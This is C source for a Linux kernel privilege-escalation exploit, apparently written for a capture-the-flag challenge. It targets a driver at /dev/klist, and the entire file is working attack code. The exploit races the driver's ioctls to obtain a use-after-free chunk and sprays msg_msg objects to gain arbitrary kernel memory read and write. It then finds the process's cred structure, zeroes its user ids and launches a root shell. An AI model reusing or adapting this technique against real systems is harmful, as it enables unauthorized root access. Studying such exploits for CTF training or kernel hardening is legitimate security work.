#include <stdio.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/auxv.h>

#include <sys/ipc.h>
#include <sys/msg.h>
#define BUFF_SIZE 96 - 48
/*
struct chunk{
    inuse
    size
    prev
    buf
}
*/
struct create_chunk_arg
{
    unsigned long int size;
    char *buf;
};
struct msg
{
    long mtype;
    char mtext[BUFF_SIZE];
};

void set_cred_root(char *cred, int len, int id)
{
    int i;
    for (i = 0; i < len; i += 4)
    {
        if (*(int *)(cred + i) == id)
            *(int *)(cred + i) = 0;
    }
}

void print_hex(char *buf, int size)
{
    int i;
    puts("======================================");
    printf("data :\n");
    for (i = 0; i < (size / 8); i++)
    {
        if (i % 2 == 0)
        {
            printf("%d", i / 2);
        }
        printf(" %16llx", *(size_t *)(buf + i * 8));
        if (i % 2 == 1)
        {
            printf("\n");
        }
    }
    puts("======================================");
}

int myMemmem(char *a, int alen, char *b, int blen)
{
    int i, j;
    for (i = 0; i <= alen - blen; ++i)
    {
        for (j = 0; j < blen; ++j)
        {
            if (a[i + j] != b[j])
            {
                break;
            }
        }
        if (j >= blen)
        {
            return i;
        }
    }
    return -1;
}

int main()
{
    struct create_chunk_arg create_arg;
    char *buf = malloc(0x200);
    int fd;
    char *res = malloc(0x1000);
    fd = open("/dev/klist", O_RDWR);
    if (fd < 0)
    {
        printf("[-]open file error\n");
        exit(-1);
    }
    memset(buf, 'a', 0x200);
    create_arg.size = 96 - 0x18;
    create_arg.buf = buf;
    ioctl(fd, 0x1337, &create_arg);
    if (fork() == 0)
    {
        for (int i = 0; i < 0x1000; i++)
        {
            ioctl(fd, 0x1337, &create_arg);
            ioctl(fd, 0x133A, res);
            if (*(int *)res == 1)
            {
                printf("[*]get the UAF chunk!\n");
                exit(0);
            }
        }
        printf("[-]gg\n");
        exit(0);
    }
    for (int i = 0; i < 0x1500; i++)
    {
        ioctl(fd, 0x133A, res);
    }

    if (fork() == 0)
    {
        for (int i = 0; i < 0x100; i++)
        {
            struct msg msg;
            int i;
            memset(msg.mtext, 0x42, BUFF_SIZE - 1);
            msg.mtext[BUFF_SIZE] = 0;
            msg.mtype = 1;
            for (i = 0; i < BUFF_SIZE; i++)
                msg.mtext[i] = '\xff';

            int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

            msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
        }
        exit(0);
    }
    sleep(3);

    memset(res, 0, 0x1000);
    ioctl(fd, 0x1338, 0);
    read(fd, res, 0x1000);
    if (*(unsigned long int *)res == 0x6161616161616161)
    {
        puts("[-] cannot realloc the chunk ");
        exit(-1);
    }
    puts("[+] now we can read everywhere");
    char *mem = malloc(0x300000);
    read(fd, mem, 0x300000);
    char cred[0x20];
    *(size_t *)cred = 0x000003e800000003;
    *(size_t *)(cred + 8) = 0x000003e8000003e8;
    *(size_t *)(cred + 0x10) = 0x000003e8000003e8;
    *(size_t *)(cred + 0x18) = 0x000003e8000003e8;
    int found = myMemmem(mem, 0x300000, cred, 0x20);
    if (found == -1)
    {
        puts("[-]cannot find cred struct !");
        exit(-1);
    }
    char *final = found + mem;
    print_hex(final - 0x8, 0xb0);
    set_cred_root(final - 0x8, 0x40, 1000);
    print_hex(final - 0x8, 0xb0);
    write(fd, mem, found + 0xb0);
    if (getuid() == 0)
    {
        printf("[+]now you are r00t,enjoy ur shell\n");
        system("/bin/sh");
    }
    else
    {
        puts("[-] there must be something error ... ");
        exit(-1);
    }

    return 0;
}